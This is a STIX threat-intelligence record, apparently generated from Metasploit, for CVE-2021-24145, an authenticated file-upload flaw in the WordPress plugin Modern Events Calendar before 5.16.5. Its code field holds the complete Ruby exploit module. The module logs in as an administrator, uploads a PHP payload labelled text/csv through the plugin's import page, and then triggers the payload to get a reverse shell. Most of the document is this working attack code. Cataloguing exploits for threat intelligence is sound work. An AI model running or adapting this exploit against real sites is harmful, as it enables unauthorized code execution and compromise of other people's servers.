{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--530dbe4a-ad2c-4b1f-b145-79bc4757e11c",
    "created": "2024-08-14T17:09:54.475999Z",
    "modified": "2024-08-14T17:09:54.476003Z",
    "name": "Wordpress Plugin Modern Events Calendar - Authenticated Remote Code Execution",
    "description": " This module allows an attacker with a privileged Wordpress account to launch a reverse shell due to an arbitrary file upload vulnerability in Wordpress plugin Modern Events Calendar < 5.16.5. This is due to an incorrect check of the uploaded file extension. Indeed, by using `text/csv` content-type in a request, it is possible to upload a .php payload as is is not forbidden by the plugin. Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/<random_payload_name>.php`  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_plugin_modern_events_calendar_rce.rb",
            "external_id": "wp_plugin_modern_events_calendar_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-24145"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Plugin Modern Events Calendar - Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module allows an attacker with a privileged Wordpress account to launch a reverse shell\n          due to an arbitrary file upload vulnerability in Wordpress plugin Modern Events Calendar < 5.16.5.\n          This is due to an incorrect check of the uploaded file extension.\n          Indeed, by using `text/csv` content-type in a request, it is possible to upload a .php payload as is is not forbidden by the plugin.\n          Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/<random_payload_name>.php`\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Nguyen Van Khanh', # Original PoC and discovery\n          'Ron Jost', # Exploit-db\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '50115'],\n          ['CVE', '2021-24145'],\n          ['CWE', '434']\n        ],\n        'Platform' => [ 'php' ],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Wordpress Modern Events Calendar < 5.16.5', {}]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2021-01-29',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username of the admin account', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password of the admin account', 'admin']),\n      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/'])\n    ]\n  end\n\n  def check\n    unless wordpress_and_online?\n      return CheckCode::Safe('Server not online or not detected as Wordpress')\n    end\n\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    if cookie\n      check_plugin_version_from_readme('modern-events-calendar-lite', '5.16.5')\n    else\n      CheckCode::Detected('The admin credentials given are wrong !')\n    end\n  end\n\n  def exploit\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    fail_with(Failure::NoAccess, 'Authentication failed') unless cookie\n    payload_name = \"#{Rex::Text.rand_text_alpha_lower(5)}.php\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(payload.encoded, 'text/csv', nil, \"form-data; name='feed'; filename='#{payload_name}'\")\n    post_data.add_part('import-start-bookings', nil, nil, \"form-data; name='mec-ix-action'\")\n\n    print_status(\"Uploading file \\'#{payload_name}\\' containing the payload...\")\n\n    r = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin.php'),\n      'headers' => {\n        'Origin' => full_uri('')\n      },\n      'vars_get' => {\n        'page' => 'MEC-ix',\n        'tab' => 'MEC-import'\n      },\n      'cookie' => cookie,\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    )\n\n    fail_with(Failure::UnexpectedReply, \"Wasn't able to upload the payload file\") unless r&.code == 200\n    register_file_for_cleanup(payload_name)\n\n    print_status('Triggering the payload ...')\n    send_request_cgi(\n      'method' => 'GET',\n      'headers' => {\n        'Origin' => full_uri('')\n      },\n      'cookie' => cookie,\n      'uri' => normalize_uri(target_uri.path, \"/wp-content/uploads/#{payload_name}\")\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-01-29",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}